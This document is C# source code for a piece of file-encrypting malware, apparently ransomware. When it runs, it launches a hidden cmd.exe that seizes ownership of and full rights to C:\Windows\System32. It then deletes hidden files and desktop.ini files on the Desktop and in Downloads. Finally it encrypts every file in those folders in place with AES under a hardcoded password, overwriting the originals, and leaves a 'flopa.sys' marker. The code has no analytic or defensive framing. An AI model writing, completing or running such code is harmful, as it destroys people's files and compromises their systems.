using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace Crock
{
	static partial class Program
	{
		// Кастыль для шифрования файла
		class EncryptionFile
		{
			public void EncryptFile(string file, string password)
			{
				byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
				byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

				passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

				byte[] bytesEncrypted = Crypt.AES_Encrypt(bytesToBeEncrypted, passwordBytes);

				string fileEncrypted = file;

				File.WriteAllBytes(fileEncrypted, bytesEncrypted);
			}
		}

		class Crypt
		{
			// Уоление desktop.ini
			private static void Destopini()
			{
				string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				string filepath = (path + @"\desktop.ini");
				string userRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
				string downloadFolder = Path.Combine(userRoot, "Downloads");
				string filedl = (downloadFolder + @"\desktop.ini");

				if (File.Exists(filepath))
				{
					File.Delete(filepath);
				}

				if (File.Exists(filedl))
				{
					File.Delete(filedl);
				}
			}

			// Метод шифрования
			public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
			{
				byte[] encryptedBytes = null;
				byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

				using (MemoryStream ms = new MemoryStream())
				{
					using (RijndaelManaged AES = new RijndaelManaged())
					{
						AES.KeySize = 256;
						AES.BlockSize = 128;

						var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
						AES.Key = key.GetBytes(AES.KeySize / 8);
						AES.IV = key.GetBytes(AES.BlockSize / 8);

						AES.Mode = CipherMode.CBC;

						using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
						{
							cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
							cs.Close();
						}
						encryptedBytes = ms.ToArray();
					}
				}

				return encryptedBytes;
			}

			// Процесс шифрования
			private static void Start_Encrypt()
			{
				string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				string userRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
				string downloadFolder = Path.Combine(userRoot, "Downloads");

				string[] files = Directory.GetFiles(path + @"\", "*", SearchOption.AllDirectories);
				string[] files3 = Directory.GetFiles(downloadFolder + @"\", "*", SearchOption.AllDirectories);

				EncryptionFile enc = new EncryptionFile();

				string password = "FLOPA LIKE POTATOES";

				for (int i = 0; i < files.Length; i++)
				{
					enc.EncryptFile(files[i], password);
				}

				for (int i = 0; i < files3.Length; i++)
				{
					enc.EncryptFile(files3[i], password);
				}
			}

			// Управление шифрованием
			public static void Main_Encrypt()
			{
				const string quote = "\"";
				ProcessStartInfo perm = new ProcessStartInfo();
				perm.FileName = "cmd.exe";
				perm.WindowStyle = ProcessWindowStyle.Hidden;
				perm.Arguments = @"/k takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant " + quote + "%username%:F" + quote;
				Process.Start(perm);

				string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				string userRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
				string downloadFolder = Path.Combine(userRoot, "Downloads");
				string filedl = (downloadFolder);

				string[] filesPaths = Directory.EnumerateFiles(path + @"\").
					Where(f => (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden).
					ToArray();
				foreach (string file2 in filesPaths)
					File.Delete(file2);

				string path2 = filedl;
				string[] filesPaths2 = Directory.EnumerateFiles(path2 + @"\").
					Where(f => (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden).
					ToArray();
				foreach (string file3 in filesPaths2)
					File.Delete(file3);

				File.WriteAllText(path + @"\flopa.sys", "encrypted");
				File.WriteAllText(downloadFolder + @"\flopa.sys", "encrypted");

				new Thread(() => Destopini()).Start();
				new Thread(() => Start_Encrypt()).Start();
			}
		}
	}
}
